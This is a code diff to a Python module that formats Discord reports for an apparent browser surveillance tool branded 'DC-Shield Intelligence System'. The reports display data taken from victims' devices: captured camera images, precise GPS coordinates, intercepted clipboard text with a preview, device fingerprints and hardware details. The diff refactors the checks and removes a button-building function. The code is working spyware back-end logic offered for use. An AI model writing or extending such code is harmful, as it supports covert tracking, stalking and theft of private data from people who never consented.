@@ -48,10 +48,13 @@ def create_combined_surveillance_embed(data):
     # Enhanced category tracking
     captured_categories = []
 
+    def is_valid_dict_with_no_error(obj):
+        return isinstance(obj, dict) and not obj.get('error')
+
     if data.get('screen'):
         categories_captured += 1
         captured_categories.append("Display")
-    if data.get('geolocation') and not data['geolocation'].get('error'):
+    if is_valid_dict_with_no_error(data.get('geolocation')):
         categories_captured += 1
         captured_categories.append("GPS Location")
         critical_data_found = True
@@ -59,26 +62,29 @@ def create_combined_surveillance_embed(data):
         categories_captured += 1
         captured_categories.append("Camera Access")
         critical_data_found = True
-    if data.get('battery') and not data['battery'].get('error'):
+    if is_valid_dict_with_no_error(data.get('battery')):
         categories_captured += 1
         captured_categories.append("Battery")
-    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
+    if isinstance(data.get('mediaDevices'), list):
         categories_captured += 1
         captured_categories.append("Media Devices")
-    if data.get('network') and not data['network'].get('error'):
+    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
+        categories_captured += 1
+        captured_categories.append("Media Devices")
+    if is_valid_dict_with_no_error(data.get('network')):
         categories_captured += 1
         captured_categories.append("Network")
-    if data.get('storage') and not data['storage'].get('error'):
+    if is_valid_dict_with_no_error(data.get('storage')):
         categories_captured += 1
         captured_categories.append("Storage")
-    if data.get('clipboard') and not data['clipboard'].get('error'):
+    if is_valid_dict_with_no_error(data.get('clipboard')):
         categories_captured += 1
         captured_categories.append("Clipboard")
         critical_data_found = True
     if data.get('canvas'):
         categories_captured += 1
         captured_categories.append("Canvas Fingerprint")
-    if data.get('webgl') and not data['webgl'].get('error'):
+    if is_valid_dict_with_no_error(data.get('webgl')):
         categories_captured += 1
         captured_categories.append("WebGL Fingerprint")
     if data.get('memory'):
@@ -108,7 +114,7 @@ def create_combined_surveillance_embed(data):
         "timestamp": datetime.now().isoformat(),
         "fields": [],
         "footer": {
-            "text": f"DC-Shield Intelligence System • {categories_captured} categories analyzed • Use buttons for details",
+            "text": f"DC-Shield Intelligence System • {categories_captured} categories analyzed",
             "icon_url": "https://cdn.discordapp.com/attachments/123456789/shield-icon.png"
         }
     }
@@ -133,21 +139,28 @@ def create_combined_surveillance_embed(data):
         timestamp = data['camera'].get('timestamp', 'Unknown')
         critical_alerts.append(f"📸 **CAMERA COMPROMISED**\n└ Image captured at {timestamp}\n└ Resolution: 640x480px")
 
-    if data.get('geolocation', {}).get('latitude'):
+    if is_valid_dict_with_no_error(data.get('geolocation')) and data['geolocation'].get('latitude'):
         lat, lng = data['geolocation'].get('latitude'), data['geolocation'].get('longitude')
         accuracy = data['geolocation'].get('accuracy', 'Unknown')
         critical_alerts.append(f"🌍 **PRECISE LOCATION ACQUIRED**\n└ Coordinates: `{lat:.6f}, {lng:.6f}`\n└ Accuracy: ±{accuracy}m")
 
-    if data.get('clipboard') and not data['clipboard'].get('error'):
+    # Critical alerts
+    if is_valid_dict_with_no_error(data.get('clipboard')):
         clip_len = data['clipboard'].get('length', 0)
         preview = data['clipboard'].get('content', '')[:30]
         critical_alerts.append(f"📋 **CLIPBOARD INTERCEPTED**\n└ Content length: {clip_len} characters\n└ Preview: `{preview}...`")
 
-    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
+    if isinstance(data.get('mediaDevices'), list):
         devices = data['mediaDevices']
-        cam_count = sum(1 for d in devices if d.get('kind') == 'videoinput')
-        mic_count = sum(1 for d in devices if d.get('kind') == 'audioinput')
-        speaker_count = sum(1 for d in devices if d.get('kind') == 'audiooutput')
+        cam_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'videoinput')
+        mic_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audioinput')
+        speaker_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audiooutput')
+        critical_alerts.append(f"🎥 **MEDIA DEVICES ENUMERATED**\n└ Cameras: {cam_count} | Microphones: {mic_count}\n└ Speakers: {speaker_count}")
+    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
+        devices = data['mediaDevices']
+        cam_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'videoinput') if isinstance(devices, list) else 0
+        mic_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audioinput') if isinstance(devices, list) else 0
+        speaker_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audiooutput') if isinstance(devices, list) else 0
         critical_alerts.append(f"🎥 **MEDIA DEVICES ENUMERATED**\n└ Cameras: {cam_count} | Microphones: {mic_count}\n└ Speakers: {speaker_count}")
 
     if critical_alerts:
@@ -187,13 +200,13 @@ def create_combined_surveillance_embed(data):
         system_profile_right.append(f"🌐 **Location**\n└ {tz.get('name', 'Unknown')}")
         system_profile_right.append(f"└ UTC{offset_hours:+.1f}")
 
-    if data.get('battery') and not data['battery'].get('error'):
+    if is_valid_dict_with_no_error(data.get('battery')):
         battery = data['battery']
         level = int(battery.get('level', 0) * 100)
         status = "🔌 Charging" if battery.get('charging') else "🔋 Discharging"
         system_profile_left.append(f"🔋 **Battery**\n└ {level}% {status}")
 
-    if data.get('network') and not data['network'].get('error'):
+    if is_valid_dict_with_no_error(data.get('network')):
         network = data['network']
         speed_info = f"{network.get('downlink', 'Unknown')} Mbps"
         latency_info = f"{network.get('rtt', 'Unknown')}ms RTT"
@@ -222,23 +235,26 @@ def create_combined_surveillance_embed(data):
         security_score += 35
         risk_factors.append("Camera access granted")
 
-    if data.get('geolocation', {}).get('latitude'):
+    if is_valid_dict_with_no_error(data.get('geolocation')) and data['geolocation'].get('latitude'):
         security_score += 30
         risk_factors.append("GPS location exposed")
 
-    if data.get('clipboard') and not data['clipboard'].get('error'):
+    if is_valid_dict_with_no_error(data.get('clipboard')):
         security_score += 25
         risk_factors.append("Clipboard data accessed")
 
-    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
+    if isinstance(data.get('mediaDevices'), list):
+        security_score += 20
+        risk_factors.append("Media devices enumerated")
+    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
         security_score += 20
         risk_factors.append("Media devices enumerated")
 
-    if data.get('canvas') or (data.get('webgl') and not data['webgl'].get('error')):
+    if data.get('canvas') or (is_valid_dict_with_no_error(data.get('webgl')) and not data['webgl'].get('error')):
         security_score += 15
         risk_factors.append("Device fingerprinting active")
 
-    if data.get('storage') and not data['storage'].get('error'):
+    if is_valid_dict_with_no_error(data.get('storage')):
         security_score += 10
         risk_factors.append("Storage information gathered")
 
@@ -273,108 +289,6 @@ def create_combined_surveillance_embed(data):
         })
 
     return embed
-
-def create_interactive_buttons(data):
-    """
-    Create interactive buttons for different data categories
-    """
-    button_row1 = []
-    button_row2 = []
-
-    # Row 1 - Critical data
-    if data.get('camera', {}).get('captured'):
-        button_row1.append({
-            "type": 2,
-            "style": 4,  # Danger (red)
-            "label": "📸 Camera",
-            "custom_id": "view_camera_data",
-            "emoji": {"name": "📷"}
-        })
-
-    if data.get('geolocation', {}).get('latitude'):
-        button_row1.append({
-            "type": 2,
-            "style": 4,  # Danger (red)
-            "label": "🌍 GPS",
-            "custom_id": "view_location_data",
-            "emoji": {"name": "📍"}
-        })
-
-    if data.get('clipboard') and not data['clipboard'].get('error'):
-        button_row1.append({
-            "type": 2,
-            "style": 4,  # Danger (red)
-            "label": "📋 Clipboard",
-            "custom_id": "view_clipboard_data",
-            "emoji": {"name": "📋"}
-        })
-
-    # Add hardware button if we have hardware data
-    if (data.get('browser', {}).get('hardwareConcurrency') or
-        data.get('deviceMemory') or
-        data.get('memory')):
-        button_row1.append({
-            "type": 2,
-            "style": 2,  # Secondary (gray)
-            "label": "⚙️ Hardware",
-            "custom_id": "view_hardware_data",
-            "emoji": {"name": "🔧"}
-        })
-
-    # Row 2 - Additional data
-    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
-        button_row2.append({
-            "type": 2,
-            "style": 2,  # Secondary
-            "label": "🎥 Devices",
-            "custom_id": "view_media_devices",
-            "emoji": {"name": "🎤"}
-        })
-
-    if data.get('network') and not data['network'].get('error'):
-        button_row2.append({
-            "type": 2,
-            "style": 2,  # Secondary
-            "label": "📡 Network",
-            "custom_id": "view_network_data",
-            "emoji": {"name": "🌐"}
-        })
-
-    if (data.get('canvas') or
-        (data.get('webgl') and not data['webgl'].get('error'))):
-        button_row2.append({
-            "type": 2,
-            "style": 2,  # Secondary
-            "label": "🎨 Fingerprint",
-            "custom_id": "view_fingerprint_data",
-            "emoji": {"name": "🔍"}
-        })
-
-    # Always add a "View All" button
-    button_row2.append({
-        "type": 2,
-        "style": 1,  # Primary (blue)
-        "label": "📊 View All",
-        "custom_id": "view_all_data",
-        "emoji": {"name": "📋"}
-    })
-
-    # Create button rows
-    components = []
-
-    if button_row1:
-        components.append({
-            "type": 1,  # Action Row
-            "components": button_row1
-        })
-
-    if button_row2:
-        components.append({
-            "type": 1,  # Action Row
-            "components": button_row2
-        })
-
-    return components
 
 def create_detailed_category_embed(data, category):
     """
